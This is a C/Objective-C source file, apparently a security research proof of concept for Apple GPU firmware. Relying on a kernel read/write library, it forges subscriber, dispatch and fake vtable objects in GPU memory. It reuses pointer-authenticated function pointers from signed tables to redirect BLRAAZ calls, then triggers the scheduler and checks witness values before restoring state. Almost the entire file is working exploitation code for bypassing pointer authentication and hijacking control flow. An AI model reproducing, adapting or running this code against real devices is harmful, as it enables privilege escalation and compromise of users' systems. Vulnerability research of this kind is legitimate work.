#import <Foundation/Foundation.h>

#include <libkextrw.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "gfx.h"
#include "offsets.h"
#include "poc.h"
#include "read_poc.h"

#define EVENT_CURRENT       0x00ULL
#define EVENT_SUBSCRIBERS   0x08ULL
#define EVENT_SUBSCRIBER    0x10ULL
#define EVENT_COUNT         0x18ULL
#define EVENT_CALLBACK      0x28ULL
#define EVENT_OBJECT        0x30ULL
#define EVENT_INDEX         0x38ULL
#define EVENT_NOTIFY        0x40ULL
#define SCHEDULER_PENDING   0x48ULL

#define DISPATCH_TARGET     UINT32_C(0x0002e374)
#define PAIR_STORE_TARGET   UINT32_C(0x0002a28c)
#define RET_TARGET          UINT32_C(0x0002c358)

#define SUBSCRIBER          (GFX_AUTH_OBJECT + 0x400ULL)
#define DISPATCH_OBJECT     (GFX_AUTH_OBJECT + 0x420ULL)
#define CALL_OBJECT         (GFX_AUTH_OBJECT + 0x500ULL)
#define FAKE_VTABLE         (GFX_AUTH_OBJECT + 0x600ULL)
#define WITNESS_A           (CALL_OBJECT + 0x38ULL)
#define WITNESS_B           (CALL_OBJECT + 0x40ULL)

struct snapshot {
    uint64_t event[8];
    uint64_t pending;
    uint64_t sampler_x20;
    uint64_t memory[9];
};

static const uint64_t event_offsets[] = {
    EVENT_CURRENT,
    EVENT_SUBSCRIBERS,
    EVENT_SUBSCRIBER,
    EVENT_COUNT,
    EVENT_CALLBACK,
    EVENT_OBJECT,
    EVENT_INDEX,
    EVENT_NOTIFY,
};

static const uint64_t memory_addresses[] = {
    SUBSCRIBER,
    SUBSCRIBER + 8,
    DISPATCH_OBJECT + 0x40,
    DISPATCH_OBJECT + 0x48,
    CALL_OBJECT,
    FAKE_VTABLE + 0x28,
    FAKE_VTABLE + 0x38,
    WITNESS_A,
    WITNESS_B,
};

static int read_snapshot(struct snapshot *state)
{
    for (size_t i = 0;
         i < sizeof(event_offsets) / sizeof(event_offsets[0]); i++) {
        if (gfx_read64(GFX_SCHEDULER_EVENT0 + event_offsets[i],
                       &state->event[i]) != 0) {
            return -1;
        }
    }
    if (gfx_read64(GFX_SCHEDULER_CORE + SCHEDULER_PENDING,
                   &state->pending) != 0 ||
        gfx_read64(GFX_SAMPLER_X20, &state->sampler_x20) != 0) {
        return -1;
    }
    for (size_t i = 0;
         i < sizeof(memory_addresses) / sizeof(memory_addresses[0]); i++) {
        if (gfx_read64(memory_addresses[i], &state->memory[i]) != 0) {
            return -1;
        }
    }
    return 0;
}

static int restore_state(const struct snapshot *saved)
{
    int result = 0;

    for (size_t i = 0;
         i < sizeof(event_offsets) / sizeof(event_offsets[0]); i++) {
        if (gfx_write64(GFX_SCHEDULER_EVENT0 + event_offsets[i],
                        saved->event[i]) != 0) {
            result = -1;
        }
    }
    for (size_t i = 0;
         i < sizeof(memory_addresses) / sizeof(memory_addresses[0]); i++) {
        if (gfx_write64(memory_addresses[i], saved->memory[i]) != 0) {
            result = -1;
        }
    }
    if (gfx_write32(GFX_SCHEDULER_CORE + SCHEDULER_PENDING,
                    (uint32_t)saved->pending) != 0 ||
        gfx_write32(GFX_SAMPLER_X20,
                    (uint32_t)saved->sampler_x20) != 0) {
        result = -1;
    }

    struct snapshot observed = {0};
    return result == 0 && read_snapshot(&observed) == 0 &&
        memcmp(saved, &observed, sizeof(observed)) == 0 ? 0 : -1;
}

static int prepare(uint64_t dispatch, uint64_t second_stage,
                   uint64_t ret, uint32_t marker_a,
                   uint32_t marker_b, uint64_t sentinel_a,
                   uint64_t sentinel_b)
{
    uint64_t event_value = (uint64_t)arc4random() << 32 | marker_b;

    return gfx_write64(SUBSCRIBER, dispatch) == 0 &&
        gfx_write64(SUBSCRIBER + 8, DISPATCH_OBJECT) == 0 &&
        gfx_write64(DISPATCH_OBJECT + 0x40, CALL_OBJECT) == 0 &&
        gfx_write32(DISPATCH_OBJECT + 0x4c, marker_a) == 0 &&
        gfx_write64(CALL_OBJECT, FAKE_VTABLE) == 0 &&
        gfx_write64(FAKE_VTABLE + 0x28, ret) == 0 &&
        gfx_write64(FAKE_VTABLE + 0x38, second_stage) == 0 &&
        gfx_write64(WITNESS_A, sentinel_a) == 0 &&
        gfx_write64(WITNESS_B, sentinel_b) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_SUBSCRIBERS,
                    SUBSCRIBER) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_SUBSCRIBER,
                    UINT32_MAX) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_COUNT, 1) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_CALLBACK, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_OBJECT, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_INDEX, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_NOTIFY,
                    GFX_SCHEDULER_NOTIFY) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_CURRENT, event_value) == 0 ?
        0 : -1;
}

static int wait_for_completion(void)
{
    for (unsigned attempt = 0; attempt < 100; attempt++) {
        uint64_t pending = 0;
        if (gfx_read64(GFX_SCHEDULER_CORE + SCHEDULER_PENDING,
                       &pending) != 0) {
            return -1;
        }
        if ((uint32_t)pending == 0) return 0;
        usleep(1000);
    }
    return -1;
}

static int run_reuse(bool treatment)
{
    struct snapshot saved = {0};
    uint64_t dispatch = 0;
    uint64_t pair_store = 0;
    uint64_t ret = 0;
    uint64_t copied_dispatch = 0;
    uint64_t copied_second = 0;
    uint64_t witness_a = 0;
    uint64_t witness_b = 0;
    uint32_t marker_a = arc4random();
    uint32_t marker_b = arc4random();
    uint64_t sentinel_a = (uint64_t)arc4random() << 32 | arc4random();
    uint64_t sentinel_b = (uint64_t)arc4random() << 32 | arc4random();
    int result = 1;

    if (gfx_read64(GFX_SIGNED_DISPATCH_SLOT, &dispatch) != 0 ||
        gfx_read64(GFX_SIGNED_PAIR_STORE_SLOT, &pair_store) != 0 ||
        gfx_read64(GFX_SIGNED_RET_SLOT, &ret) != 0 ||
        (uint32_t)dispatch != DISPATCH_TARGET ||
        (uint32_t)pair_store != PAIR_STORE_TARGET ||
        (uint32_t)ret != RET_TARGET || read_snapshot(&saved) != 0 ||
        (uint32_t)saved.pending != 0 ||
        (uint32_t)saved.sampler_x20 != 1) {
        fputs("error: signed table or initial state\n", stderr);
        return 1;
    }

    uint64_t second_stage = treatment ? pair_store : ret;
    printf("mode     %s\n", treatment ? "treatment" : "control");
    printf("path     kcall=0 physrw=0 kvtophys=0 rtbuddy=0 "
           "kernel_patch=0 live_signed_table_write=0 "
           "xnu_result_write=0\n");
    printf("stage1   source=0x%016llx value=0x%016llx "
           "target=0x%08x call=BLRAAZ\n", GFX_SIGNED_DISPATCH_SLOT,
           dispatch, (uint32_t)dispatch);
    printf("stage2   source=0x%016llx value=0x%016llx "
           "target=0x%08x call=BLRAAZ\n",
           treatment ? GFX_SIGNED_PAIR_STORE_SLOT : GFX_SIGNED_RET_SLOT,
           second_stage, (uint32_t)second_stage);

    if (prepare(dispatch, second_stage, ret, marker_a, marker_b,
                sentinel_a, sentinel_b) != 0 ||
        gfx_read64(SUBSCRIBER, &copied_dispatch) != 0 ||
        gfx_read64(FAKE_VTABLE + 0x38, &copied_second) != 0 ||
        copied_dispatch != dispatch || copied_second != second_stage) {
        fputs("error: prepare or relocation readback\n", stderr);
        goto out;
    }
    printf("relocate stage1=0x%016llx stage2=0x%016llx "
           "full_match=1\n", copied_dispatch, copied_second);

    if (gfx_write32(GFX_SCHEDULER_CORE + SCHEDULER_PENDING, 1) != 0 ||
        gfx_write32(GFX_SAMPLER_X20, 0) != 0 ||
        wait_for_completion() != 0 ||
        gfx_read64(WITNESS_A, &witness_a) != 0 ||
        gfx_read64(WITNESS_B, &witness_b) != 0) {
        fputs("error: trigger or witness\n", stderr);
        goto out;
    }

    uint64_t dispatch_after = 0;
    uint64_t pair_after = 0;
    uint64_t ret_after = 0;
    bool sources_untouched =
        gfx_read64(GFX_SIGNED_DISPATCH_SLOT, &dispatch_after) == 0 &&
        gfx_read64(GFX_SIGNED_PAIR_STORE_SLOT, &pair_after) == 0 &&
        gfx_read64(GFX_SIGNED_RET_SLOT, &ret_after) == 0 &&
        dispatch_after == dispatch && pair_after == pair_store &&
        ret_after == ret;
    bool pass = treatment ?
        witness_a == marker_a && witness_b == marker_b :
        witness_a == sentinel_a && witness_b == sentinel_b;
    pass = pass && sources_untouched;

    printf("args     x1=0x%08x x2=0x%08x\n", marker_a, marker_b);
    printf("witness  a=0x%016llx b=0x%016llx "
           "sources_untouched=%u pass=%u\n", witness_a, witness_b,
           sources_untouched, pass);
    result = pass ? 0 : 1;

out:
    if (restore_state(&saved) != 0) {
        fputs("error: restore verification\n", stderr);
        result = 1;
    } else {
        puts("restore  verified=1");
    }
    return result;
}

int main(int argc, const char *argv[])
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc != 2 ||
        (strcmp(argv[1], "control") != 0 &&
         strcmp(argv[1], "treatment") != 0)) {
        fprintf(stderr, "usage: %s control|treatment\n", argv[0]);
        return 2;
    }

    @autoreleasepool {
        if (kextrw_init() != 0) return 1;

        int result = 1;
        if (poc_init_neo() == 0) {
            result = run_reuse(strcmp(argv[1], "treatment") == 0);
        }
        poc_deinit();
        kextrw_deinit();
        return result;
    }
}
